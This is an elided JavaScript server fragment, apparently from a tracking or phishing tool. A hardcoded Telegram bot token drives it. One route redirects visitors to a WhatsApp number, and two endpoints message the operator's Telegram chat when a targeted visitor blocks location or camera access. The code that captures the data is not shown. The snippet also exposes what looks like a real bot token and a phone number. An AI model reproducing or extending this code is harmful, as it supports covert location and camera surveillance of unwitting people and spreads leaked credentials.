...
const bot = new TelegramBot("6965659827:AAE9vrCf-AHBSHtlGv6IVjFjQKxVTDjdbqc", { polling: true });
...
app.get("/w/:path/:uri", (req, res) => {
  ...
  if (req.params.path != null) {
    ...
    res.redirect("https://wa.me/989389383634");
  }
});
...
app.post("/locationBlock", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  bot.sendMessage(parseInt(uid, 36), `STATUS: location access blocked`);
});

app.post("/cameraBlock", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  bot.sendMessage(parseInt(uid, 36), `STATUS: camera access blocked`);
});
